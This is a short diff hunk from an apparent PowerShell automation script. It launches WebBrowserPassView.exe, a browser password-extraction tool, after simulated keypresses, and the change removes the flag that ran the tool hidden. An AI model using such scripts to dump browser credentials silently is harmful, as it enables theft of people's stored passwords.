@@ -35,7 +35,7 @@ Start-Sleep -Seconds 5
 
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
+Start-Process -FilePath '.\WebBrowserPassView.exe'
 
 Add-Type -AssemblyName System.Windows.Forms
 
